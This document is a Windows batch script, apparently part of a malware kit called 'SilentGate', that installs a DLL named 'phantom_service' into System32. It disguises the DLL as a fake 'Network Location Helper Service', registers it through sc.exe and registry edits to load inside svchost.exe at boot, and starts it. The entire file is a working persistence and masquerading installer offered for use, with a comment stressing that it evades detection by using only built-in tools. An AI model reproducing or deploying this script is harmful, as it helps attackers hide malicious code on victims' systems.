@echo off
:: SilentGate v5.0 - Phantom Service Installer
:: Author: JarDani
:: Uses only legitimate Windows administration tools

echo [INSTALL] Registering NetworkLocationHelper...

:: Copy DLL to system location
copy /Y "/home/jardani/silentgate/output/v5/phantom_service.dll" "%SystemRoot%\System32\NetworkLocationHelper.dll" >nul
echo [INSTALL] DLL deployed to System32

:: Register service via sc.exe
sc create NetworkLocationHelper ^
    binPath= "%SystemRoot%\system32\svchost.exe -k netsvcs" ^
    type= share ^
    start= auto ^
    DisplayName= "Network Location Helper Service" >nul

echo [INSTALL] Service registered

:: Set service description
sc description NetworkLocationHelper "Provides helper functions for network location awareness and connectivity monitoring." >nul

:: Set service DLL in registry
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NetworkLocationHelper\Parameters" ^
    /v ServiceDll /t REG_EXPAND_SZ ^
    /d "%SystemRoot%\System32\NetworkLocationHelper.dll" /f >nul

reg add "HKLM\SYSTEM\CurrentControlSet\Services\NetworkLocationHelper\Parameters" ^
    /v ServiceMain /t REG_SZ /d "ServiceMain" /f >nul

reg add "HKLM\SYSTEM\CurrentControlSet\Services\NetworkLocationHelper\Parameters" ^
    /v ServiceDllUnloadOnStop /t REG_DWORD /d 1 /f >nul

:: Add to netsvcs group so svchost loads it
for /f "tokens=3*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v netsvcs') do (
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" ^
        /v netsvcs /t REG_MULTI_SZ /d "%%a %%b NetworkLocationHelper" /f >nul
)

echo [INSTALL] Registry configured
echo [INSTALL] Starting service...

sc start NetworkLocationHelper

echo [INSTALL] NetworkLocationHelper is running inside svchost.exe
echo [INSTALL] Complete
